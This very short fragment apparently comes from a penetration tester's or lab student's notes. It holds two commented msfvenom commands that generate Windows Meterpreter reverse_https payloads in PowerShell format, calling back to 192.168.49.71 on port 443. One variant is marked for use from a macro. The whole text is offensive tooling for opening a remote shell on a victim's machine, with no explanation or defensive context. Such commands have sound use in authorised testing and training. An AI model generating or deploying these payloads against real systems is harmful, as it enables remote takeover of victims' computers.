...
# msfvenom -p windows/64/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 EXITFUNC=thread -f ps1
# if run from macro  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 EXITFUNC=thread -f ps1
